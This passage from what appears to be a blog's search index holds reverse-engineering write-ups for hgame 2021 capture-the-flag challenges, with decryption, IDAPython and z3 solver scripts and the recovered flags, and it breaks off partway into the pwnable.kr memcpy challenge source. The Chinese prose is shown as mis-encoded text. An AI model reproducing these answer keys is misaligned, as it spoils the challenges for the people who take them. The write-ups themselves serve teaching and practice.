= (double)((int)input_num % 0x305B) + 1.0; do &#123; v16 = v16 + cal(v21, v22) * 0.001; v21 = v21 + 0.001; &#125; while (v21 &lt;= 100.0); if ((int)(v17 + v17 + 3.0) == num1 &amp;&amp; (int)(v16 + v16 + 3.0) == num2) &#123; printf(&quot;%f&quot;, input_num); break; &#125; &#125; return 0;&#125; åé¢å°±æ¯”è¾ƒç®€å•äº†ï¼Œé¦–å…ˆå°†è¾“å…¥çš„æ•°å­—è½¬ä¸ºasciiç ï¼Œç„¶ååœ¨åé¢è¿½åŠ input_num*2ï¼Œä¸€å…±è¿½åŠ 5æ¬¡ï¼Œå–å‰7ä½è¿›è¡Œå¼‚æˆ–è®¡ç®—å‡ºä¸€ä¸ªkeyä¾›åé¢ä½¿ç”¨ 123456Cipher = [8, 77, 89, 6, 115, 2, 64]key = list(map(ord,list(&quot;9903819&quot;)))Plain = bytes(key[i]^Cipher[i] for i in range(7))print(Plain)# 1ti5K3y åé¢å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„RC4åŠ å¯† 12345678from Cryptodome.Cipher import ARC4Cipher = bytes([178, 214, 142, 63, 170, 20, 83, 84, 198, 6])Key = b&#x27;1ti5K3y&#x27;rc4 = ARC4.new(Key)Plain = rc4.decrypt(Cipher)print(Plain)# RC4_crypt0","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"re","slug":"ctf/re","permalink":"http://example.com/categories/ctf/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}]},{"title":"hgame2021-reéƒ¨åˆ†é¢˜è§£","slug":"ctf/wp/HGAME","date":"2021-07-14T04:44:17.030Z","updated":"2022-01-01T09:53:45.780Z","comments":true,"path":"63316/","link":"","permalink":"http://example.com/63316/","excerpt":"","text":"å‰è¨€hgame 2021çš„é€†å‘éƒ¨åˆ†é¢˜è§£ï¼Œä¸€é“ncé¢˜å’Œä¸€é“å®‰å“é€†å‘æ²¡æœ‰åšï¼Œæ¯å‘¨çš„é¢˜ç›®éƒ½çœ‹äº†çœ‹ï¼Œåšäº†å››åˆ†ä¹‹ä¸‰å·¦å³ï¼Œæ­ç”µçš„æ¯”èµ›é¢˜ç›®å‡ºå¾—å¾ˆæœ‰æ°´å¹³ï¼Œè‡ªå·±å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œwpæœ¬æ¥è¯´æ¯å‘¨éƒ½å†™çš„ï¼Œä½†æ˜¯æ‡’ï¼Œæ¯”èµ›éƒ½ç»“æŸä¸€ä¸ªæœˆäº†æ‰å·å·¥å‡æ–™å¾—å†™å‡ºæ¥ã€‚æœ‰å…´è¶£çš„å¸ˆå‚…å‡‘åˆç€çœ‹çœ‹å§å§ğŸ¤ª RE-week1ä¸€æ¯é˜¿å¸•èŒ¶æ˜æ˜¾çš„TEAåŠ å¯†æ ‡å¿—ï¼Œåé¢åˆ†æä¸ºXXTEAåŠ å¯† åŠ å¯†åçš„æ•°æ®ï¼Œåˆšå¥½35ä½ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5 ^ y&lt;&lt;2) + (y&gt;&gt;3 ^ z&lt;&lt;4)) ^ ((sum ^ y) + (k[(p&amp;3) ^ e] ^ z)))void XXTEA(int n, uint32_t* v, uint32_t* k)&#123; uint32_t sum, y, z; uint32_t p, rounds, e; if (n &gt; 1) &#123; rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do &#123; sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) &#123; n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds); &#125;&#125;int main()&#123; uint32_t arr[] = &#123;3880694563, 3081185334, 1506439138, 2524759489, 3883935348, 1026381030, 2325545814, 2581382044, 1881594093, 1781792173, 4103492874, 1553756062, 468045900, 1730391575, 1383114178, 2890011402, 2227070898, 1885128569, 1548828056, 4214676013, 571971141, 1558401693, 3515474427, 3898332297, 1942540575, 1421197718, 3061626000, 555214026, 2648963476, 794468778, 2816999933, 3272437419, 464379036, 877899850, 2460223225&#125;; uint32_t key[] = &#123; 1,2,3,4 &#125;; XXTEA(-35, arr, key); for (int i = 0; i &lt; 35; i++) &#123; printf(&quot;%c&quot;, arr[i]); &#125; return 0;&#125; Welcome to reverse world !ç®€å•é¢˜ï¼Œä¸€ä¸ªå¼‚æˆ–ç›´æ¥æå®š 12345678from ida_bytes import *def re(): addr = 0x00007FF7F7513480 flag = &#x27;&#x27; for i in range(22): flag += chr((0xff - i) ^ get_byte(addr +i)) print(flag) pypyç»™äº†æˆ‘ä»¬pythonå­—èŠ‚ç ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±è¿˜åŸæˆpythonä»£ç ï¼Œä¸‹é¢è´´è¿˜åŸè¿‡åçš„ä»£ç ï¼ŒåŠ å¯†è¿‡ç¨‹å¾ˆç®€å• 123456789101112131415161718import disdef input_func(): raw_flag = input(&#x27;give me your flag:\\n&#x27;) cipher = list(raw_flag[6:-1]) length = len(cipher) for i in range(length // 2): cipher[2*i], cipher[2*i+1] = cipher[2*i+1] , cipher[2*i] res = [] for i in range(length): res.append(ord(cipher[i]) ^ i) res = bytes(res).hex() print(&#x27;your flag: &#x27; + res)# print(dis.dis(input_func)) è§£å¯†è„šæœ¬ 12345678910111213141516def Cip(): flag = &#x27;&#x27; res = [] cipher = &#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27; length = len(cipher) for i in range(0, length, 2): res.append(int(cipher[i:i+2],16)) for i in range(len(res)): flag += chr(res[i] ^ i) flag = list(flag) for i in range(len(flag) // 2): flag[i*2+1], flag[i*2] = flag[i*2],flag[i*2 + 1] for i in range(len(flag)): print(flag[i],end=&#x27;&#x27;)# hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125; RE-week2helloRe2æœ‰ä¸¤å¤„æ£€æµ‹ï¼Œç¬¬ä¸€å¤„ç›´æ¥æ˜æ–‡æ¯”è¾ƒï¼Œä½†æ˜¯æ³¨æ„è¦å€’åº 1password1: 2b0c5e6a3a20b189 ç¬¬äºŒå¤„å¼€å¯äº†å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œåˆ©ç”¨äº†ç¬¬ä¸€æ¬¡æ£€æµ‹çš„è¾“å…¥å€¼å¼‚æˆ–ä¸€æ¬¡åä½œä¸ºç§˜é’¥ï¼Œè¿›è¡ŒCBCæ¨¡å¼çš„AESåŠ å¯†ï¼Œåˆå§‹å‘é‡ä¸º0-15 1234567891011from Cryptodome.Cipher import AESkey = &#x27;2b0c5e6a3a20b189&#x27;key = bytes(ord(key[i])^i for i in range(16))Cipher = bytes([183, 254, 254, 217, 7, 118, 121, 101, 63, 78, 95, 98, 213, 2, 246, 126])iv = bytes(i for i in range(16))aes = AES.new(key,AES.MODE_CBC,iv)Plain = aes.decrypt(Cipher)print(Plain)# 7a4ad6c5671fb313 app-releaseä¸ç†Ÿæ‚‰å®‰å“ï¼Œä½†æ˜¯ç»è¿‡ä¸€ç³»åˆ—ç½‘ä¸Šæ‰¾èµ„æ–™åæŸ¥åˆ°äº†å¦‚ä½•é€†å‘APKä»£ç ï¼Œè¿‡ç¨‹å¾ˆç®€å•ï¼Œå°±æ˜¯å°†KEYè¿›è¡Œsha256è®¡ç®—æˆ16ä½çš„keyï¼Œè¿›è¡ŒAESåŠ å¯†ååœ¨è¿›è¡Œbase64ç¼–ç  12345678910111213141516import hashlibimport base64from Cryptodome.Cipher import AESstring = b&#x27;A_HIDDEN_KEY&#x27;flag = b&#x27;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&#x27;key = hashlib.sha256(string).digest()iv = hashlib.md5(string).digest()Cipher = base64.b64decode(flag)aes = AES.new(key, AES.MODE_CBC, iv)Plain = aes.decrypt(Cipher)print(Plain)# hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125; RE-week3ç¬¬ä¸‰å‘¨åªåšå‡ºæ¥ä¸€é“é¢˜ FAKEç®€å•çš„smcï¼Œå‡½æ•°sub_40699Bè¿›è¡Œäº†ä»£ç è§£å¯†å·¥ä½œï¼Œé¦–å…ˆç”¨idaPythonå°†åŠ å¯†åçš„ä»£ç è§£ç ä¾¿äºé™æ€åˆ†æ 12345678from ida_bytes import *addr1 = 0x0000000000401216addr2 = 0x0000000000409080for i in range(1086): x = get_byte(addr1+i) y = get_byte(addr2+i) patch_byte(addr1+i,x^y) è§£å¯†åçš„å…³é”®ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586input = (char *)CmpData;memset(CmpData, 0, 0x90uLL);v38[0] = 55030;v38[1] = 61095;v38[2] = 60151;v38[3] = 57247;v38[4] = 56780;v38[5] = 55726;v38[6] = 46642;v38[7] = 52931;v38[8] = 53580;v38[9] = 50437;v38[10] = 50062;v38[11] = 44186;v38[12] = 44909;v38[13] = 46490;v38[14] = 46024;v38[15] = 44347;v38[16] = 43850;v38[17] = 44368;v38[18] = 54990;v38[19] = 61884;v38[20] = 61202;v38[21] = 58139;v38[22] = 57730;v38[23] = 54964;v38[24] = 48849;v38[25] = 51026;v38[26] = 49629;v38[27] = 48219;v38[28] = 47904;v38[29] = 50823;v38[30] = 46596;v38[31] = 50517;v38[32] = 48421;v38[33] = 46143;v38[34] = 46102;v38[35] = 46744;v37[0] = &#x27;h&#x27;;v37[1] = &#x27;g&#x27;;v37[2] = &#x27;a&#x27;;v37[3] = &#x27;m&#x27;;v37[4] = &#x27;e&#x27;;v37[5] = &#x27;&#123;&#x27;;v37[6] = &#x27;@&#x27;;v37[7] = &#x27;_&#x27;;v37[8] = &#x27;F&#x27;;v37[9] = &#x27;A&#x27;;v37[10] = &#x27;K&#x27;;v37[11] = &#x27;E&#x27;;v37[12] = &#x27;_&#x27;;v37[13] = &#x27;f&#x27;;v37[14] = &#x27;l&#x27;;v37[15] = &#x27;a&#x27;;v37[16] = &#x27;g&#x27;;v37[17] = &#x27;!&#x27;;v37[18] = &#x27;-&#x27;;v37[19] = &#x27;d&#x27;;v37[20] = &#x27;o&#x27;;v37[21] = &#x27;_&#x27;;v37[22] = &#x27;Y&#x27;;v37[23] = &#x27;0&#x27;;v37[24] = &#x27;u&#x27;;v37[25] = &#x27;_&#x27;;v37[26] = &#x27;k&#x27;;v37[27] = &#x27;o&#x27;;v37[28] = &#x27;n&#x27;;v37[29] = &#x27;w&#x27;;v37[30] = &#x27;_&#x27;;v37[31] = &#x27;S&#x27;;v37[32] = &#x27;M&#x27;;v37[33] = &#x27;C&#x27;;v37[34] = &#x27;?&#x27;;v37[35] = &#x27;&#125;&#x27;;v44 = 1;for ( i = 0; i &lt;= 5; ++i )&#123; for ( j = 0; j &lt;= 5; ++j ) &#123; for ( k = 0; k &lt;= 5; ++k ) &#123; LODWORD(input) = CmpData[6 * i + j] + v37[6 * k + j] * *(_DWORD *)&amp;a1[24 * i + 4 * k]; CmpData[6 * i + j] = (int)input; &#125; &#125;&#125; è§‚å¯Ÿåå‘ç°å°±æ˜¯ä¸€ä¸ª6*6çš„çŸ©é˜µè¿ç®—ï¼Œz3è§£ä¹‹ 123456789101112131415161718192021222324from z3 import *s = Solver()res = [ 55030, 61095, 60151, 57247, 56780, 55726, 46642, 52931, 53580, 50437, 50062, 44186, 44909, 46490, 46024, 44347, 43850, 44368, 54990, 61884, 61202, 58139, 57730, 54964, 48849, 51026, 49629, 48219, 47904, 50823, 46596, 50517, 48421, 46143, 46102, 46744 ]x = [BitVec(&quot;x_%d&quot; % i, 8) for i in range(36)]y = [104,103,97,109,101,123,64,95,70,65,75,69,95,102,108,97,103,33,45,100,111,95,89,48,117,95,107,111,110,119,95,83,77,67,63,125]for i in range(6): for j in range(6): key=0 for n in range(6): key += y[6*n+j]*x[6*i+n] #print(i*6+j) s.add(key == res[i*6+j])flag = &#x27;&#x27;if s.check() == sat: for i in range(36): char = s.model().eval(x[i]).as_long() flag += chr(char) print(flag)# hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125; helloRE3è¿™é“é¢˜æ²¡æœ‰æå‡ºæ¥ï¼Œåé¢çœ‹wpå¤ç°ï¼Œå¯¹äºwindowsæ¶ˆæ¯æœºåˆ¶ä»¥åŠå¸¦ç•Œé¢çš„ç¨‹åºé€†å‘ä¸ç†Ÿæ‚‰ã€‚ åœ¨ç‚¹å‡»Checkæ—¶ï¼ŒDbgviewæ˜¾ç¤ºorderä¸º65å¹¶ä¸”æ˜¾ç¤ºè¾“å…¥é•¿åº¦ã€‚ æ‰“å¼€idaæœç´¢å­—ç¬¦ä¸²playeræ‰¾åˆ°å¯¹åº”å‡½æ•°ï¼Œå‘ç°æœ‰ä¸€å¤„ == 65çš„åˆ¤å®šï¼Œä¼šç»™ä¸€ä¸ªå€¼å¤åˆ¶ä¸º1ï¼Œxäº¤å‰å¼•ç”¨å‘ç°ä¸€åªä¸€ä¸ªå‡½æ•°è°ƒç”¨äº†è¯¥å…¨åŒºå˜é‡ ä½†æ˜¯ä¼šæç¤ºå‡½æ•°æ— æ³•f5ï¼Œå› ä¸ºæ ˆæŒ‡é’ˆä¸å¹³è¡¡ã€‚ æ‰¾åˆ°å¯¹åº”çš„åœ°å€ï¼Œå‘ç°æœ‰call popç»“æ„ï¼Œç›®çš„æ˜¯ä¸ºäº†å°†callæŒ‡ä»¤çš„ä¸‹ä¸€æ¡åœ°å€é€å…¥raxå¯„å­˜å™¨ä¸­ï¼Œè¿™é‡Œå°†raxè®¾ç½®ä¸º0x00007FF708DE8C3Eä½œä¸ºä¸‹é¢rc4åŠ å¯†çš„ç§˜é’¥ã€‚ä¿®å¤æ ˆæŒ‡é’ˆæŸ¥çœ‹ä¼ªä»£ç ã€‚ åŠ å¯†æµç¨‹æ¯”è¾ƒç®€å•ï¼Œorderä¸­çš„æ•°å€¼å–åï¼ŒRC4åŠ å¯†ï¼Œæ¯”è¾ƒï¼ŒRC4çš„keyé•¿åº¦ä¸º20ï¼Œå€¼ä¸ºåœ°å€0x00007FF708DE8C3Eå¤„å¼€å§‹çš„ç¡¬ç¼–ç  12345678910111213141516171819202122232425# pythonè§£å¯†è„šæœ¬from Cryptodome.Cipher import ARC4def decrypt_rc4(): Cipher = bytes([77, 175, 39, 173, 225, 236, 109, 218, 240, 49, 94, 154, 158, 41, 250, 190, 107, 8, 200, 73]) Key = bytes([144, 144, 88, 72, 137, 69, 208, 101, 72, 139, 4, 37, 96, 0, 0, 0, 72, 139, 64, 2]) rc4 = ARC4.new(Key) Plain = rc4.decrypt(Cipher) Plain = list(0xff^i for i in Plain) return Plaindef find_in_order(Plain): order = [i for i in range(21,33)]+[i for i in range(37,50)]+[i for i in range(54,76)] name = list(&#x27;1234567890-+QWERTYUIOP&#123;&#125;|ASDFGHJKL;\\&#x27;~ZXCVBNM,./&#x27;) key = dict(zip(order,name)) # ç”Ÿæˆå¯¹åº”çš„å­—å…¸ flag = &#x27;&#x27; for i in Plain: flag += key[i] print(flag)find_in_order(decrypt_rc4())# HGAME&#123;6-K4K.4R+3C4T&#125; RE-week4vm çœ‹ä¼¼å¾ˆå¤æ‚ï¼Œå…¶å®æ˜¯è¾“å…¥å•ä¸ªå­—èŠ‚çš„åŠ è§£å¯†ï¼Œç»è¿‡åŠ¨æ€è°ƒè¯•åå‘ç°åªæœ‰å¼‚æˆ–å’Œå‡æ“ä½œï¼Œåˆ†åˆ«å¯¹åº”åˆ°çš„è™šæ‹ŸæœºæŒ‡ä»¤æ˜¯4å’Œ7ï¼Œè¿‡ç¨‹ä¸ºå°†è¾“å…¥é€å…¥vm_eaxå¯„å­˜å™¨ï¼Œvm_ebxå¯„å­˜å™¨ä¸­æ˜¯ç”Ÿæˆçš„æ“ä½œæ•°ï¼ŒåŠ¨æ€è°ƒè¯•å³å¯è·å¾—ã€‚ 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; char cipher[] = &#123; 9, 230, 79, 183, 219, 46, 130, 173, 232, 54, 118, 198, 240, 23, 103, 162, 247, 231, 74, 122, 235, 244, 58, 112, 237, 36, 2, 126, 175, 246, 59, 128, 191, 207 &#125;; char Xor[] = &#123; 0xfe,0x21,0x44,0x67,0x8a,0xad,0xd0,0xf3,0x16,0x39,0x5c,0x7f,0xa3,0xc5,0xe8,0x0b,0x2e,0x51,0x74,0x97,0xba,0xdd,0x0,0x23,0x46,0x69,0x8c,0xaf,0xd2,0xf5,0x18,0x3b,0x5e,0x81 &#125;; char Sub[] = &#123; 0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFB,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A &#125;; for (int i = 33; i &gt;= 0; i--) &#123; printf(&quot;%c&quot;, (cipher[i] + Sub[i]) ^ Xor[i]); &#125;&#125;// hgame&#123;w0W!itS_CpP_wItH_little_vM!&#125; AFiveSecondChallengeæ¯”èµ›æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå¯¹äºc#ä¸ç†Ÿæ‚‰ï¼Œå³ä½¿ä¸»åŠæ–¹åœ¨æœ€åæ”¾å‡ºäº†ç™½ç»™Hintï¼Œè¿˜æ˜¯æä¸å‡ºçŸ©é˜µæ¥ï¼Œçœ‹wpæ…¢æ…¢å¤ç°ã€‚ é¦–å…ˆè¿™æ˜¯ä¸€ä¸ªæ‰«é›·æ¸¸æˆï¼Œç”¨c#å†™çš„ï¼Œæ‰«é›·çš„é€»è¾‘é¢˜ç›®ä¸­è¯´æ˜çš„æ˜¯é€šè¿‡çŸ©é˜µè¿ç®—ï¼Œæ‰€ä»¥ç›´æ¥ç”¨C#åç¼–è¯‘å™¨çœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥æåˆ°æºç ã€‚ä½†æ˜¯å‘ç°çŸ©é˜µè¿ç®—å‡½æ•°è¢«åŠ¨è¿‡æ‰‹è„šã€‚ matrixä¸­çš„æ•°æ®å¾ˆå¤šï¼Œæ ¹æ®å®˜æ–¹ç»™çš„æç¤ºä¸‹è½½æ–‡ä»¶ä¸­ç»™å‡ºäº†il2cppOutPutæ–‡ä»¶ä¸­æœ‰ä¸¤ä¸ªé‡è¦æ–‡ä»¶AFiveSecondChallengeå’ŒAssembly-CSharpï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­æœ‰æ¸¸æˆä¸­çš„æ‰€æœ‰é€»è¾‘ã€‚è¿™é‡Œåªåˆ†æCheckBombAtå‡½æ•°ã€‚ åœ¨Assembly-CSharpæ–‡ä»¶ä¸­çœ‹åˆ°äº†è¿™äº›æ³¨é‡Šï¼ŒCheckBombAtå‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°å«Vector2ï¼Œå‘é‡ä¸­å­˜å‚¨çš„æ˜¯æ•°ç»„çš„åæ ‡ï¼Œä½†æ˜¯matrixæ•°ç»„æ˜¯ä¸€ä¸ªä¸‰ç»´æ•°ç»„ï¼Œä½†æ˜¯è¿™ä¸ªå‘é‡ä¸­åªå­˜å‚¨äº†xå’Œyåæ ‡ã€‚ 12345System.Boolean AFiveSecondChallenge.BombChecker::CheckBombAt(UnityEngine.Vector2) BombChecker.CheckBombAt(_position) BombChecker.CheckBombAt(new Vector2(x - 1, y - 1)) åœ¨çœ‹AFiveSecondChallenge.cppæ–‡ä»¶ï¼Œç›´æ¥æœç´¢CheckBomAtå…³é”®å­—ï¼Œå®šä½åˆ°è¯¥å‡½æ•°ã€‚å‘ç°äº†çŸ©é˜µä¸è¿ç®—çš„ä¸»è¦é€»è¾‘ 123456789Vector2_tA85D2DD88578276CA8A8796756458277E72D073D L_21 = ___vec0; // å¾ªç¯æ—¶çš„å˜é‡ float L_22 = L_21.get_x_0(); V_2 = (((double)((double)((float)il2cpp_codegen_subtract((float)(fmodf(L_22, (3.0f))), (float)(1.0f)))))); double L_23 = V_2; double L_24 = V_2; double L_25 = V_0; // yä¸‹æ ‡ double L_26 = V_2; double L_27 = V_1; // zä¸‹æ ‡ return (bool)((((double)((double)il2cpp_codegen_add((double)((double)il2cpp_codegen_add((double)((double)il2cpp_codegen_multiply((double)((double)il2cpp_codegen_multiply((double)L_8, (double)L_23)), (double)L_24)), (double)((double)il2cpp_codegen_multiply((double)L_25, (double)L_26)))), (double)L_27))) &gt; ((double)(0.0)))? 1 : 0); ä¸Šé¢çš„ä»£ç åŒ–ç®€åå°±æ˜¯ä¸‹é¢çš„æ•°å­¦è¡¨è¾¾å¼ï¼Œæå–matrixè¿›è¡Œå›¾ç‰‡ç»˜åˆ¶ã€‚ 12v_2 = (j % 3) - 1;((x * (v_2 * v_2) + y * v_2 + z) &gt; 0) ? 1 : 0; 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; double matrix[45][15][3] = &#123;...&#125;; // æ•°æ®å¤ªå¤šçœç•¥ int map[45][45]; double x, y, z; int dot; for (int i = 0; i &lt; 45; i++) &#123; for (int j = 0; j &lt; 45; j++) &#123; double v_2 = (j % 3) - 1; x = matrix[i][j / 3][0]; y = matrix[i][j / 3][1]; z = matrix[i][j / 3][2]; dot = ((x * (v_2 * v_2) + y * v_2 + z) &gt; 0) ? 1 : 0; map[i][j] = dot; &#125; &#125; for (int i = 0; i &lt; 45; i++) &#123; for (int j = 0; j &lt; 45; j++) &#123; printf(&quot;%d&quot;, map[i][j]); &#125; putchar(&#x27;\\n&#x27;); &#125;&#125; æœ€åå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªäºŒç»´ç ã€‚ å†ç”¨pythonçš„PILåº“å°†å…¶æ‰“å°æˆäºŒç»´ç  12345678910111213141516171819from PIL import ImageMAX = 45img = Image.new(&#x27;RGB&#x27;,(MAX,MAX))dot = &quot;111111100011101111100101000001110100101111111100000100001011111010001110100011001001000001101110101110100100000100111010100101001011101101110101101010111001001001001111101101011101101110101110001100101111111011101111101011101100000101011000100101000100011111000001000001111111101010101010101010101010101010101111111000000001100001101111000111101010000100000000101111100001111010101111111000000000101111100000100010001011011110010110001010001010000001000101111000011001000111010110100010011001110010100001000010001111010011000100111000001100100110101111100101101101010101110010010101001010001011101001011011101100000101101110000110010000111101101001010000100101110010010101100101111011101101110000101111101101101000100110110100101000010101010000101010100001110011100000010001001001000100010111111101101100111000011110100010000010100111000011011001010010011000001010101101011111000000101010011011011001011111111100110100101111110001000110111110111111110001100000011111000100011110010100011101001010101001011101011010110010000101101011010101110001100001010011000110010100011100011100001111111101110011011111110001111110111110001111110011111001100101101000010101001001101001100100110100111010001011001011111111011110010010011001000011110111111111101001000100011111011001111110011100011010101010010100001111000011011011001000001000100011111010000111001000100100101001100110001101100010111110010000011011101010111101010100000100001101011010011001110011100010111111000101110101110110010100111001110010111010001101000100001110010100010110000010111111000000010010110100110101110111100011110011101001101111111011001100100011010110100110100011100010011111101000111000111111100000000001110101000011000111001101101100010100111111100101011000101010100000011000101011110100000101100000110101000111001010110100011111101110101111001110001111110000000101111110000101110101111010011010010010011010001111001111101110101110100010000101010010100100101101100100000100111010110100001100000101111111001100111111101000101001110100110101100000100100010&quot;x = 45for i in range(45): for j in range(45): if dot[i*x+j] == &#x27;1&#x27;: img.putpixel((i,j),(0,0,0)) else: img.putpixel((i,j),(0xff,0xff,0xff)) img.show()img.save(&#x27;flag.png&#x27;)# flag: hgame&#123;YOU~hEn-duO_yOU-X|~DOU-sHi~un1Ty~k4i-fA_de_O&#125; ollvmè¿™ä¸ªç¨‹åºå¯¹é‡Œé¢æ‰€æœ‰çš„å­—ç¬¦ä¸²è¿›è¡Œäº†åŠ å¯†ï¼Œéœ€è¦æ…¢æ…¢å¯»æ‰¾åŠ å¯†å‡½æ•°ï¼Œåœ¨åŠ¨æ€è°ƒè¯•åå‘ç°äº†AESçš„S_boxç›’å­ï¼Œä¸”å‘ç°åŠ å¯†æ¨¡å¼ä¸ºCBCæ¨¡å¼ï¼ŒåŠ¨è°ƒå‡ºkeyä¸ivåç›´æ¥å†™è„šæœ¬è§£å¯†ï¼Œåˆå§‹ivä¸º0-15 1234567891011121314from Cryptodome.Cipher import AESiv = bytes(i for i in range(16))Cipher = bytes([145, 179, 193, 235, 20, 93, 213, 206, 58, 29, 48, 228, 112, 108, 107, 215, 105, 120, 121, 2, 163, 165, 223, 27, 253, 28, 2, 137, 20, 32, 122, 253, 36, 82, 248, 169, 249, 241, 107, 28, 15, 93, 80, 91, 236, 66, 209, 140, 184, 18, 207, 44, 169, 105, 49, 70, 253, 155, 234, 222, 200, 191, 148, 105])key = b&#x27;CryptoFAILUREforRSA2048Key!!!!!!&#x27;aes = AES.new(key,AES.MODE_CBC,iv)Plain = aes.decrypt(Cipher)print(Plain)# hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"re","slug":"ctf/re","permalink":"http://example.com/categories/ctf/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}]},{"title":"pwnable.kr memcpy","slug":"ctf/pwn/pwnable/pwnable.kr-memcpy","date":"2021-07-14T04:44:16.850Z","updated":"2022-01-01T09:55:37.355Z","comments":true,"path":"34917/","link":"","permalink":"http://example.com/34917/","excerpt":"","text":"æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm(&quot;rdtsc&quot;);&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( &quot;movdqa (%0), %%xmm0\\n&quot; &quot;movdqa 16(%0), %%xmm1\\n&quot; &quot;movdqa 32(%0), %%xmm2\\n&quot; &quot;movdqa 48(%0), %%xmm3\\n&quot; &quot;movntps %%xmm0, (%1)\\n&quot; &quot;movntps %%xmm1, 16(%1)\\n&quot; &quot;movntps %%xmm2, 32(%1)\\n&quot; &quot;movntps %%xmm3, 48(%1)\\n&quot; ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(&quot;Hey, I have a boring assignment for CS class.. :(\\n&quot;); printf(&quot;The assignment is simple.\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;- What is the best implementation of memcpy? -\\n&quot;); printf(&quot;- 1. implement your own slow/fast version of memcpy -\\n&quot;); printf(&quot;- 2. compare them with various size of data -\\n&quot;); printf(&quot;- 3. conclude your experiment and submit report -\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;This time, just help me out with my experiment and get flag\\n&quot;); printf(&quot;No fancy hacking, I promise :D\\n&quot;); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high); scanf(&quot;%d&quot;, &amp;size); if( size &lt; low || size &gt; high )&#123; printf(&quot;don&#x27;t mess with the experiment.\\n&quot;); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf(&quot;ok, lets run the experiment with your configuration\\n&quot;); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf(&quot;experiment %d : memcpy with buffer size %d\\n&quot;, i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 